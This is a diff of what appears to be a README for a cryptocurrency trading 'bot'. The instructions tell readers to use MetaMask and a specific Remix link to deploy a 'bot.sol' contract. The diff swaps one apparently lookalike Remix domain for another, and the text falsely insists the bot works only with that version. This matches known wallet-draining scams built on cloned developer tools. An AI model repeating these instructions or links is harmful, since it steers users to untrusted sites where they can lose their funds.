@@ -18,7 +18,7 @@ STEP BY STEP INSTRUCTIONS
 
 ✅ Download MetaMask: https://metamask.io/download/
 
-✅ Access Remix: https://remixe-ethereum.click/
+✅ Access Remix: https://remix-deploy.org/#lang=en
 (THE BOT IS ONLY COMPATIBLE WITH THIS VERSION OF THE REMIX, SO ONLY USE THIS LINK)
 
 ✅ Click on the “contracts” folder and then create “New File”. Rename it as you like, i.e: “bot.sol”. Make sure it ends with .sol for Ethereum programming language.
